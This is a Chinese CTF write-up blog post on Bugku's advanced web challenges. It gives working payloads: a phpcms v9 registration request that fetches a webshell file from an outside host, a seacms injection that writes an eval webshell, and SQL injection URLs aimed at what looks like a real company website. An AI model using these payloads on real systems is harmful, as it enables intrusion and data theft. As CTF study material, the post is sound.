title: bugku的web进阶
author: Qianye
abbrlink: b1db4319
tags:
  - ctf
categories: []
date: 2018-03-07 23:32:00
---
一些cms网站的实战，挺多不会做的，以后再来补做一下。
<!-- more -->
# phpcmsv9
直接给poc</br>
post请求
```bash
http://120.24.86.145:8001/index.php?m=member&c=index&a=register&siteid=1  


siteid=1&modelid=11&username=q12w312415&password=12w121346&email=wwq1w3124156@qq.com&info[content]=<img src=http://p4gdp8beq.bkt.clouddn.com/qy.txt?.php#.jpg>&dosubmit=1&protocol=  
```
注意，src为一句话文本的地址，每次请求用户名，邮箱都要改变


# 海洋cms
[seacms6.45漏洞利用](http://blog.csdn.net/qq_35078631/article/details/76595817)</br>
[seacms6.55漏洞任意执行](http://www.freebuf.com/vuls/150303.html)</br>
[phpinfo()中的一些重要信息](http://www.php.cn/php-weizijiaocheng-359309.html)</br>
不会插入一句话，请教了舍友。POST请求
```BASH
http://120.24.86.145:8008/search.php?searchtype=5




searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=fwrite(&9[]=fopen('QIANYE.php','w')&9[]=,'<?php eval($_POST["QIANYE"]);?>');
```
# sql实战注入2

用椰树扫一下找到注入点</br>
查看字段数
```bash
http://www.kabelindo.co.id/readnews.php?id=99999999 order by 5 %23
```
一开始只列出本网站数据库的表名，把最后一个表名添加上去，一直显示错误。最后，才明白要列出本数据库中表名的最后一个才是。</br>
列出mysql数据库中所有的表名
```bash
http://www.kabelindo.co.id/readnews.php?id=99999999 union select 1,2,3,table_name,4 from information_schema.tables
```
# sql实战1